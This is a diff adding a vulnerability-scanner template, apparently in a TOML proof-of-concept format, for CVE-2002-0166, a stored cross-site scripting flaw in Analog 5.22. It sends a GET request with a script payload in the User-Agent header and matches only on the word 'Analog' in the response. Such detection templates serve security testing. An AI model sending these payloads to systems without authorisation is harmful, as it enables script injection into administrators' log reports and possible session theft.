@@ -1,0 +1,31 @@
+[info]
+author = "AVE"
+description = "检测 Analog 5.22 跨站脚本漏洞。向目标发送包含恶意 JavaScript 的 HTTP 请求，该请求被记录到 Analog 访问日志中。当管理员查看 Analog 生成的 HTML 报告时，日志中的脚本将在浏览器中执行，导致敏感信息泄露或会话劫持。"
+id = "POC-AVE-2002-0153"
+name = "CVE-2002-0166 PoC"
+severity = "medium"
+tags = ["cve-2002-0166"]
+vuln_id = [
+    "CVE-2002-0166",
+    "AVE-2002-0153",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/analog/"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "<script>prompt(1)</script>"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Analog",
+    "analog",
+]
